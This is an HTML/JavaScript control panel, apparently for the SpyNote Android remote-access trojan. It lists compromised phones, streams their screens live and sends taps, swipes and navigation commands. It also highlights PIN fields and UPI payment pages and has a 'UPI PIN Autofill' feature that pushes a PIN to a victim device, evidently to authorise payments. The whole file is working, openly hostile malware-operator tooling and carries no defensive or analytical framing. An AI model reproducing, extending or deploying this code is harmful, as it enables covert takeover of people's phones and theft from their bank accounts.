<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote - UPI Control Pro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
            background: #0a0a0a; color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; background: rgba(0,0,0,0.95); 
            padding: 20px; max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        .device { padding: 15px; margin: 10px 0; background: #222; cursor: pointer; 
            border-radius: 10px; transition: all 0.3s; border: 1px solid #444; }
        .device:hover { background: #444; transform: translateX(8px); }
        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; box-shadow: 0 0 20px #00ff88; }
        .disconnected { opacity: 0.4; }

        #phone-frame {
            width: 380px; height: 820px; margin: 30px auto; 
            background: #111; border: 30px solid #222; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 25px 50px rgba(0,0,0,0.8), inset 0 0 20px rgba(255,255,255,0.1);
        }
        #screen-canvas { 
            width: 100%; height: 100%; background: #000; border-radius: 25px;
            image-rendering: pixelated; image-rendering: -moz-crisp-edges;
        }
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            pointer-events: none; border-radius: 25px; z-index: 10;
        }
        .layout-element {
            position: absolute; background: rgba(0,255,136,0.3); border: 2px solid #00ff88;
            border-radius: 4px; transition: all 0.2s; cursor: pointer;
        }
        .layout-element:hover { background: rgba(0,255,136,0.6); transform: scale(1.02); }
        .pin-element { background: rgba(255,100,100,0.5) !important; border-color: #ff6666 !important; }
        .upi-page { background: rgba(255,215,0,0.6) !important; border-color: #ffd700 !important; }

        #stats { 
            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
            padding: 15px; border-radius: 10px; font-size: 13px; text-align: center; 
            backdrop-filter: blur(10px); border: 1px solid #333; min-width: 200px;
        }
        #controls { 
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 10px; background: rgba(0,0,0,0.9); padding: 15px 25px;
            border-radius: 30px; backdrop-filter: blur(20px); border: 1px solid #444;
        }
        #upi-panel {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            background: rgba(0,0,0,0.98); padding: 30px; border-radius: 20px; 
            backdrop-filter: blur(30px); border: 2px solid #00ff88; display: none;
            z-index: 1000; min-width: 350px;
        }
        #pin-input { 
            width: 100%; padding: 20px; font-size: 24px; text-align: center; 
            background: #111; color: #00ff88; border: 2px solid #00ff88; 
            border-radius: 15px; margin: 15px 0; font-family: monospace;
        }
        button {
            padding: 12px 20px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 20px; cursor: pointer; 
            font-weight: 600; transition: all 0.3s; box-shadow: 0 5px 20px rgba(0,123,255,0.4);
            margin: 5px;
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,123,255,0.6); }
        .layout-toggle { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); }
        .layout-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
        .upi-toggle { background: linear-gradient(45deg, #ffd700, #ffaa00); color: #000; }
        .upi-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
        .autofill-btn { background: linear-gradient(45deg, #ff6b6b, #ee5a5a) !important; }
        #overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.8); z-index: 999; display: none; 
        }
    </style>
</head>
<body>
    <div id="overlay" onclick="closeUpiPanel()"></div>
    
    <div id="upi-panel">
        <h3 style="color: #00ff88; margin-bottom: 20px;">üîê UPI PIN Autofill</h3>
        <input type="password" id="pin-input" maxlength="6" placeholder="Enter 4-6 digit PIN">
        <div style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
            <button onclick="setPin('1234')">1Ô∏è‚É£2Ô∏è‚É£3Ô∏è‚É£4Ô∏è‚É£</button>
            <button onclick="setPin('5678')">5Ô∏è‚É£6Ô∏è‚É£7Ô∏è‚É£8Ô∏è‚É£</button>
            <button onclick="setPin('0000')">0Ô∏è‚É£0Ô∏è‚É£0Ô∏è‚É£0Ô∏è‚É£</button>
            <button onclick="clearPin()">üóëÔ∏è Clear</button>
        </div>
        <div style="margin-top: 20px;">
            <button class="autofill-btn" onclick="startAutofill()">üöÄ Start Autofill</button>
            <button onclick="closeUpiPanel()">‚ùå Close</button>
        </div>
        <div id="autofill-status" style="margin-top: 15px; font-size: 14px;"></div>
    </div>

    <div id="devices">
        <h3 style="margin-bottom: 15px; color: #00ff88;">üì± Devices Online</h3>
        <div id="device-list">Loading devices...</div>
    </div>
    
    <div id="stats">
        <div>Status: <span id="status" style="color: #ff6b6b;">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span></div>
        <div>Device: <span id="deviceName">-</span></div>
        <div id="layoutInfo" style="font-size: 11px; color: #aaa;">Layout: OFF</div>
        <div id="upiStatus" style="font-size: 11px; color: #ffd700;">UPI Autofill: OFF</div>
    </div>

    <div id="phone-frame">
        <canvas id="screen-canvas"></canvas>
        <canvas id="layout-overlay"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="sendHome()">üè† Home</button>
        <button class="layout-toggle" onclick="toggleLayout()" id="layoutBtn">üó∫Ô∏è Layout</button>
        <button class="upi-toggle" onclick="toggleUpiPanel()" id="upiBtn">üîê UPI</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let frameCount = 0, lastFrameTime = 0, avgFps = 0;
        let frameQueue = [];
        let isDragging = false, dragStart = {};
        let showLayout = false;
        let layoutElements = [];
        let canvas, ctx, overlayCtx, phoneFrame;
        let currentPin = '';
        let autofillEnabled = false;

        canvas = document.getElementById('screen-canvas');
        overlayCtx = document.getElementById('layout-overlay').getContext('2d');
        phoneFrame = document.getElementById('phone-frame');

        socket.on('connect', () => {
            document.getElementById('status').textContent = 'üü¢ LIVE';
            document.getElementById('status').style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            frameQueue.push(data);
            if (frameQueue.length === 1) renderNextFrame();
            
            frameCount++;
            const now = performance.now();
            if (now - lastFrameTime >= 1000) {
                avgFps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                document.getElementById('fps').textContent = avgFps;
                frameCount = 0;
                lastFrameTime = now;
            }
        });

        socket.on('upi-status', (status) => {
            document.getElementById('upiStatus').textContent = `UPI Autofill: ${status.enabled ? 'üü¢ ON' : 'üî¥ OFF'}`;
            document.getElementById('upiStatus').style.color = status.enabled ? '#00ff88' : '#ff6b6b';
        });

        function renderNextFrame() {
            if (frameQueue.length === 0) return;
            
            const data = frameQueue.shift();
            const img = new Image();
            
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                const screenCtx = canvas.getContext('2d');
                screenCtx.imageSmoothingEnabled = false;
                screenCtx.clearRect(0, 0, canvas.width, canvas.height);
                screenCtx.drawImage(img, 0, 0, canvas.width, canvas.height);
                
                if (showLayout && data.layout) {
                    renderLayoutOverlay(data.layout, rect);
                }
                
                if (frameQueue.length > 0) {
                    requestAnimationFrame(renderNextFrame);
                }
            };
            
            img.src = `data:image/jpeg;base64,${data.data}`;
            deviceWidth = data.width || 1080;
            deviceHeight = data.height || 2400;
        }

        function renderLayoutOverlay(layout, rect) {
            const overlayCanvas = document.getElementById('layout-overlay');
            overlayCanvas.width = rect.width;
            overlayCanvas.height = rect.height;
            
            overlayCtx.clearRect(0, 0, rect.width, rect.height);
            layoutElements = [];
            
            layout.forEach((element) => {
                const x = (element.bounds.left / deviceWidth) * rect.width;
                const y = (element.bounds.top / deviceHeight) * rect.height;
                const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
                const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
                
                const isPin = element.isPin;
                const isUpiPage = element.isUpiPage;
                
                overlayCtx.fillStyle = isUpiPage ? 'rgba(255,215,0,0.5)' : 
                                     isPin ? 'rgba(255,100,100,0.4)' : 'rgba(0,255,136,0.3)';
                overlayCtx.strokeStyle = isUpiPage ? '#ffd700' : 
                                       isPin ? '#ff6666' : '#00ff88';
                overlayCtx.lineWidth = 3;
                overlayCtx.strokeRect(x, y, w, h);
                overlayCtx.font = 'bold 14px monospace';
                overlayCtx.fillStyle = isUpiPage ? '#ffd700' : isPin ? '#ff6666' : '#00ff88';
                overlayCtx.fillText(`${element.text?.slice(0,8) || element.contentDescription?.slice(0,8) || ''}`, x+5, y+22);
                
                layoutElements.push({ x, y, w, h, isPin, isUpiPage, element });
            });
        }

        function updateDeviceList(devices) {
            document.getElementById('device-list').innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model?.slice(0,12) || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''}</small><br>
                        <span style="color: ${info.connected ? '#00ff88' : '#ff6b6b'}">
                            ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                        </span>
                    </div>
                `).join('') : '<div style="color:#666;">No devices</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            document.getElementById('deviceName').textContent = deviceId.slice(0,12);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            frameQueue = [];
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            return {
                x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
            };
        }

        ['mousedown', 'mousemove', 'mouseup'].forEach(event => {
            phoneFrame.addEventListener(event, (e) => {
                e.preventDefault();
                const coords = getScaledCoords(e.clientX, e.clientY);
                
                if (event === 'mousedown') {
                    isDragging = true;
                    dragStart = coords;
                    sendTap(coords.x, coords.y);
                } else if (event === 'mousemove' && isDragging) {
                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
                } else if (event === 'mouseup') {
                    isDragging = false;
                }
            });
        });

        ['touchstart', 'touchmove', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, (e) => {
                e.preventDefault();
                const touch = e.touches[0] || e.changedTouches[0];
                const coords = getScaledCoords(touch.clientX, touch.clientY);
                
                if (event === 'touchstart') {
                    isDragging = true;
                    dragStart = coords;
                    sendTap(coords.x, coords.y);
                } else if (event === 'touchmove' && isDragging) {
                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
                } else if (event === 'touchend') {
                    isDragging = false;
                }
            }, { passive: false });
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'tap', x, y });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey, duration: 250 
            });
        }

        function sendBack() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'back' }); }
        function sendHome() { if (currentDevice) socket.emit('control', { deviceId: currentDevice, action: 'home' }); }

        function toggleLayout() {
            showLayout = !showLayout;
            const btn = document.getElementById('layoutBtn');
            const info = document.getElementById('layoutInfo');
            btn.textContent = showLayout ? 'üìã Hide Layout' : 'üó∫Ô∏è Show Layout';
            btn.classList.toggle('active');
            info.textContent = `Layout: ${showLayout ? 'ON' : 'OFF'}`;
            info.style.color = showLayout ? '#00ff88' : '#aaa';
        }

        function toggleUpiPanel() {
            const panel = document.getElementById('upi-panel');
            const overlay = document.getElementById('overlay');
            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
            overlay.style.display = panel.style.display;
        }

        function closeUpiPanel() {
            document.getElementById('upi-panel').style.display = 'none';
            document.getElementById('overlay').style.display = 'none';
        }

        function setPin(pin) {
            document.getElementById('pin-input').value = pin;
            currentPin = pin;
        }

        function clearPin() {
            document.getElementById('pin-input').value = '';
            currentPin = '';
        }

        function startAutofill() {
            currentPin = document.getElementById('pin-input').value;
            if (currentPin.length < 4) {
                alert('Enter 4-6 digit PIN');
                return;
            }
            
            if (!currentDevice) {
                alert('Select a device first');
                return;
            }

            socket.emit('set-upi-pin', { deviceId: currentDevice, pin: currentPin });
            document.getElementById('autofill-status').textContent = `‚úÖ PIN ${currentPin} set for ${currentDevice.slice(0,12)}`;
            autofillEnabled = true;
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        phoneFrame.addEventListener('click', (e) => {
            if (!showLayout || !currentDevice) return;
            const rect = phoneFrame.getBoundingClientRect();
            const x = (e.clientX - rect.left) * (deviceWidth / rect.width);
            const y = (e.clientY - rect.top) * (deviceHeight / rect.height);
            
            const clickedElement = layoutElements.find(el => 
                x >= el.x && x <= (el.x + el.w) &&
                y >= el.y && y <= (el.y + el.h)
            );
            
            if (clickedElement) {
                sendTap(clickedElement.element.bounds.centerX, clickedElement.element.bounds.centerY);
                if (clickedElement.isPin) {
                    console.log('üéØ PIN TAPPED:', clickedElement.element.text);
                }
            }
        });

        document.getElementById('pin-input').addEventListener('input', (e) => {
            currentPin = e.target.value;
        });
    </script>
</body>
</html>
